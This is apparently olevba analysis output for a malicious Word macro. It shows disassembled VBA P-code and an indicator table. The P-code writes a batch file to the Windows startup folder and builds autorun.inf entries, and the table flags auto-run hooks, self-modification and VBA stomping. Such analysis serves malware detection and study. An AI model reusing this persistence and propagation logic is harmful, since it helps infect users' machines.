' 	PrintChan 
' 	Ld Part11$ 
' 	Ld snag$ 
' 	Add 
' 	Ld n$ 
' 	Add 
' 	PrintItemNL 
' Line #183:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	Ld Part11$ 
' 	Ld snag1$ 
' 	Add 
' 	Ld n$ 
' 	Add 
' 	PrintItemNL 
' Line #184:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	Ld Part2$ 
' 	Ld snag$ 
' 	Add 
' 	Ld n$ 
' 	Add 
' 	PrintItemNL 
' Line #185:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	Ld Part2$ 
' 	Ld snag1$ 
' 	Add 
' 	Ld n$ 
' 	Add 
' 	PrintItemNL 
' Line #186:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0003 "cls"
' 	PrintItemNL 
' Line #187:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	Ld Part2$ 
' 	LitStr 0x002F "c:\windows\startm~1\programs\startup\msfile.bat"
' 	Add 
' 	PrintItemNL 
' Line #188:
' 	Ld hFile 
' 	Close 0x0001 
' Line #189:
' 	EndSub 
' Line #190:
' 	FuncDefn (Sub dhIconDisco(strFile As String))
' Line #191:
' 	Dim 
' 	VarDefn hFile (As Long)
' Line #192:
' 	OnError (Resume Next) 
' Line #193:
' 	ArgsCall Read 0x0000 
' Line #194:
' 	Ld u16742 
' 	Ld c5435 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x22DE 
' 	Mul 
' 	FnInt 
' 	Concat 
' 	St f18727 
' Line #195:
' 	Ld Rnd 
' 	LitDI2 0x0002 
' 	Mul 
' 	FnInt 
' 	St Choice 
' Line #196:
' 	Ld m12807 
' 	Ld e9975 
' 	Concat 
' 	St k8534 
' Line #197:
' 	Ld Rnd 
' 	LitDI2 0x0042 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0002 
' 	Add 
' 	St rnn$ 
' Line #198:
' 	Ld Rnd 
' 	LitDI2 0x001B 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St rn$ 
' Line #199:
' 	Ld u6416 
' 	Ld c1682 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x008C 
' 	Mul 
' 	FnInt 
' 	Concat 
' 	St f10751 
' Line #200:
' 	LitStr 0x0009 "[autorun]"
' 	St Part1$ 
' Line #201:
' 	LitStr 0x0024 "icon = c:\windows\system\pifmgr.dll,"
' 	St Part2$ 
' Line #202:
' 	LitStr 0x0025 "icon = c:\windows\SYSTEM\shell32.dll,"
' 	St Part22$ 
' Line #203:
' 	Ld Part2$ 
' 	Ld rn$ 
' 	Add 
' 	St Part3$ 
' Line #204:
' 	Ld Part22$ 
' 	Ld rnn$ 
' 	Add 
' 	St Part33$ 
' Line #205:
' 	Ld Friend 
' 	St hFile 
' Line #206:
' 	Ld strFile 
' 	Ld hFile 
' 	LitDefault 
' 	Open (For Output Access Write)
' Line #207:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	Ld Part1$ 
' 	PrintItemNL 
' Line #208:
' 	Ld Choice 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #209:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	Ld Part3$ 
' 	PrintItemNL 
' Line #210:
' 	ElseBlock 
' Line #211:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	Ld Part33$ 
' 	PrintItemNL 
' Line #212:
' 	EndIfBlock 
' Line #213:
' 	Ld hFile 
' 	Close 0x0001 
' Line #214:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|shell32             |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
|IOC       |msfile.bat          |Executable file name                         |
|IOC       |autorun.inf         |Executable file name                         |
|IOC       |pifmgr.dll          |Executable file name                         |
|IOC       |shell32.dll         |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

